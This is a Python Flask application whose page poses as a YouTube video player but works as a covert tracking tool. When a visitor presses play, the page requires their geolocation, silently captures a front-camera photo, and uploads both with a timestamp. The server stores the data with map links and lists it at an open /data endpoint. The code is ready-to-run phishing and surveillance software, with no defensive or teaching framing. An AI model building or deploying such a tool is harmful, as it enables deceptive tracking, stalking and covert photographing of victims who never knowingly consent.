import os
import uuid
import json
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

# Create necessary directories
os.makedirs('photos', exist_ok=True)
os.makedirs('data', exist_ok=True)

# Store user data
user_data_file = 'data/user_data.json'

def save_user_data(lat, lon, photo_filename, timestamp):
    """Save user data to JSON file"""
    data = {
        'timestamp': timestamp,
        'latitude': lat,
        'longitude': lon,
        'photo': photo_filename,
        'map_link': f"https://www.google.com/maps?q={lat},{lon}"
    }
    
    # Load existing data
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            all_data = json.load(f)
    else:
        all_data = []
    
    all_data.append(data)
    
    # Save updated data
    with open(user_data_file, 'w') as f:
        json.dump(all_data, f, indent=2)
    
    return data

@app.route('/')
def index():
    # You can replace this YouTube video ID with any video you want
    youtube_video_id = "GWvfyvKUTZI"  # From the link you provided
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0;
        }
        
        .video-wrapper {
            position: relative;
            width: 100%;
            max-width: 100vw;
            height: 100vh;
            background: #000;
        }
        
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        
        .video-thumbnail {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-image: url('https://img.youtube.com/vi/{{ video_id }}/maxresdefault.jpg');
        }
        
        .play-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: rgba(255, 0, 0, 0.8);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .play-overlay:hover {
            background: rgba(255, 0, 0, 1);
            transform: translate(-50%, -50%) scale(1.1);
        }
        
        .play-icon {
            width: 0;
            height: 0;
            border-left: 25px solid white;
            border-top: 15px solid transparent;
            border-bottom: 15px solid transparent;
            margin-left: 5px;
        }
        
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            display: none;
        }
        
        #video, #canvas {
            display: none;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        
        .loading-content {
            text-align: center;
            color: white;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="video-wrapper">
        <div class="video-container">
            <div class="video-thumbnail" id="thumbnail" onclick="startVideo()">
                <div class="play-overlay">
                    <div class="play-icon"></div>
                </div>
            </div>
            <iframe 
                id="youtubePlayer"
                src=""
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
            </iframe>
        </div>
    </div>
    
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>
    </div>
    
    <video id="video"></video>
    <canvas id="canvas"></canvas>
    
    <script>
        let locationData = null;
        let cameraStream = null;
        const videoId = '{{ video_id }}';
        
        async function startVideo() {
            const loadingOverlay = document.getElementById('loadingOverlay');
            loadingOverlay.style.display = 'flex';
            
            try {
                // Step 1: Request Location (REQUIRED)
                await requestLocation();
                
                // Step 2: Request Camera (TRY, but continue if failed)
                try {
                    await requestCamera();
                    await capturePhoto();
                } catch (cameraError) {
                    console.log('Camera not available, continuing without photo');
                    // Send location data without photo
                    await sendDataWithoutPhoto();
                }
                
                // Step 3: Play video
                playVideo();
                
            } catch (error) {
                loadingOverlay.style.display = 'none';
                alert('Location access is required to watch the video. Please allow location access.');
                location.reload();
            }
        }
        
        function requestLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation is not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        console.log('Location granted:', locationData);
                        resolve();
                    },
                    (error) => {
                        reject(new Error('Location access denied'));
                    }
                );
            });
        }
        
        function requestCamera() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then((stream) => {
                        cameraStream = stream;
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        video.play();
                        console.log('Camera access granted');
                        resolve();
                    })
                    .catch((error) => {
                        reject(new Error('Camera access denied'));
                    });
            });
        }
        
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob((blob) => {
                        const formData = new FormData();
                        formData.append('lat', locationData.lat);
                        formData.append('lon', locationData.lon);
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('timestamp', new Date().toISOString());
                        
                        fetch('/upload', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Data sent successfully:', data);
                            // Stop camera
                            if (cameraStream) {
                                cameraStream.getTracks().forEach(track => track.stop());
                            }
                            resolve();
                        })
                        .catch((error) => {
                            console.error('Error sending data:', error);
                            resolve(); // Continue anyway
                        });
                    }, 'image/jpeg');
                }, 1000);
            });
        }
        
        function sendDataWithoutPhoto() {
            return new Promise((resolve, reject) => {
                const formData = new FormData();
                formData.append('lat', locationData.lat);
                formData.append('lon', locationData.lon);
                formData.append('timestamp', new Date().toISOString());
                formData.append('no_photo', 'true');
                
                fetch('/upload', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Location data sent (no photo):', data);
                    resolve();
                })
                .catch((error) => {
                    console.error('Error sending data:', error);
                    resolve(); // Continue anyway
                });
            });
        }
        
        function playVideo() {
            const thumbnail = document.getElementById('thumbnail');
            const player = document.getElementById('youtubePlayer');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            // Hide thumbnail and loading
            thumbnail.style.display = 'none';
            loadingOverlay.style.display = 'none';
            
            // Show and play video
            player.style.display = 'block';
            player.src = `https://www.youtube.com/embed/${videoId}?autoplay=1&controls=1&rel=0`;
        }
    </script>
</body>
</html>
    ''', video_id=youtube_video_id)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        lat = request.form['lat']
        lon = request.form['lon']
        timestamp = request.form.get('timestamp', datetime.now().isoformat())
        no_photo = request.form.get('no_photo', 'false')
        
        if no_photo == 'true':
            # Save without photo
            data = {
                'timestamp': timestamp,
                'latitude': lat,
                'longitude': lon,
                'photo': 'No photo captured',
                'map_link': f"https://www.google.com/maps?q={lat},{lon}"
            }
            
            # Load existing data
            if os.path.exists(user_data_file):
                with open(user_data_file, 'r') as f:
                    all_data = json.load(f)
            else:
                all_data = []
            
            all_data.append(data)
            
            # Save updated data
            with open(user_data_file, 'w') as f:
                json.dump(all_data, f, indent=2)
            
            print(f"\n{'='*50}")
            print(f"New User Data Received (Location Only):")
            print(f"Time: {timestamp}")
            print(f"Location: {data['map_link']}")
            print(f"{'='*50}\n")
            
            return jsonify({
                'status': 'success',
                'message': 'Location data received',
                'map_link': data['map_link']
            })
        else:
            # Save with photo
            photo = request.files['photo']
            photo_filename = f"photos/{uuid.uuid4()}.jpg"
            photo.save(photo_filename)
            
            # Save data
            data = save_user_data(lat, lon, photo_filename, timestamp)
            
            print(f"\n{'='*50}")
            print(f"New User Data Received:")
            print(f"Time: {timestamp}")
            print(f"Location: {data['map_link']}")
            print(f"Photo: {photo_filename}")
            print(f"{'='*50}\n")
            
            return jsonify({
                'status': 'success',
                'message': 'Data received successfully',
                'map_link': data['map_link']
            })
    except Exception as e:
        print(f"Error processing upload: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/data')
def view_data():
    """View all collected data"""
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            data = json.load(f)
        return jsonify(data)
    return jsonify([])

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
